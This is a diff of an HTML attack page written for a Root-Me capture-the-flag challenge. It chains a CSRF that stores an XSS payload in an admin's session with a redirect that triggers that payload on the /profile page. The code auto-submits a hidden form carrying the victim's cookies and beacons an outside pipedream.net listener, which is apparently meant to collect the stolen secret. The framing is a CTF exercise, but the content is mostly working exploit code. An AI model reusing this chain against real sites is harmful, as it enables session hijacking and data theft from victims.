@@ -28,7 +28,6 @@
     <script>
         const CHALLENGE_DOMAIN = "http://challenge01.root-me.org:58003";
         const VULNERABLE_PAGE = "/profile";
-        const CSRF_ENDPOINT = CHALLENGE_DOMAIN + "/login";
         
         // --- FIX DE LA CHAÎNE XSS ---
         // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
@@ -55,59 +54,30 @@
         
         // --- Exécution de l'attaque ---
 
-        // PHASE 1: CSRF (Amorçage de session) - Using fetch to bypass pop-up
+        // PHASE 1 : CSRF (Amorçage de session)
         function executeCsrf() {
-            // Data to be sent in the POST request body
-            const formData = new URLSearchParams();
-            formData.append('username', MALICIOUS_PAYLOAD);
+            // Définit la valeur malveillante dans le champ de formulaire masqué
+            document.getElementById('username').value = MALICIOUS_PAYLOAD;
 
-            // Use fetch to send the POST request
-            fetch(CSRF_ENDPOINT, {
-                method: 'POST',
-                // Important: 'no-cors' mode is required for cross-origin *HTTP* requests 
-                // initiated from an *HTTPS* page, but for a CSRF attack on the victim's 
-                // browser to work, the browser must send credentials (cookies).
-                // 'cors' mode with 'credentials: "include"' is the standard approach 
-                // for credential-carrying cross-origin requests.
-                mode: 'cors',
-                credentials: 'include',
-                headers: {
-                    // Set the correct content type for form submission
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: formData.toString()
-            })
-            .then(response => {
-                console.log("Phase 1: CSRF POST executed via fetch.");
-                
-                // You can send a log to your listener after the fetch is complete
-                fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_fetch_success');
-            })
-            .catch(error => {
-                console.error("Phase 1: CSRF POST fetch failed:", error);
-                // Log failure for debugging
-                fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_fetch_failed');
-            });
+            // Soumet automatiquement le formulaire au domaine cible, en envoyant les cookies de l'Admin.
+            fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_executed');
+
+            setTimeout(function() {
+              document.getElementById('csrfForm').submit();
+              console.log("Phase 1: CSRF POST submitted. Payload stored in Admin's session.");        
+            }, 1000);
         }
 
-        // PHASE 2: Livraison par Opener (Déclenchement XSS)
         function executeOpenerDelivery() {
-            // The vulnerable domain is the target, so we open it in the same window
-            // The 'opener' mechanism you had might be for a different type of exploit.
-            // For a successful CSRF -> XSS chain where the victim needs to land on a page
-            // to trigger the XSS, a simple redirect or page load often works.
-            
-            // For this specific sequence: CSRF (store payload) -> Redirect (trigger payload)
-            // We just need the browser to navigate to the page where the payload is rendered.
-
-            // Use window.location.href or window.location.replace to redirect the current tab.
-            // If the goal is a new tab, stick to window.open.
-            const targetWindow = window.open(CHALLENGE_DOMAIN + VULNERABLE_PAGE, '_blank');
+            // 1. Ouvre un nouvel onglet vers le domaine cible pour établir la relation 'opener'.
+            const targetWindow = window.open('about:blank', '_blank');
 
             if (targetWindow) {
-                console.log("Phase 2: Target page opened.");
-                document.querySelector('.card h1').textContent = "Attack Initiated!";
-                document.querySelector('.card p').textContent = "Payload sent. Check your listener for the secret.";
+                console.log("Phase 2: Target window opened.");
+
+                // 2. Redirige la fenêtre cible vers la page vulnérable.
+                targetWindow.location = CHALLENGE_DOMAIN + VULNERABLE_PAGE;
+                console.log("Phase 2: Redirected target to vulnerable page /profile.");
             } else {
                 console.error("Popup blocked! Attack failed.");
                 document.querySelector('.card h1').textContent = "Attack Failed!";
@@ -117,11 +87,10 @@
 
         // --- Enchaînement des étapes d'attaque ---
 
-        // 1. Execute the CSRF submission immediately
+        // 1. Exécute le CSRF immédiatement au chargement pour stocker le payload.
         executeCsrf();
 
-        // 2. Wait a moment then trigger the XSS rendering page load
-        setTimeout(executeOpenerDelivery, 1500);
+        setTimeout(executeOpenerDelivery, 1000);
     </script>
 </body>
 </html>
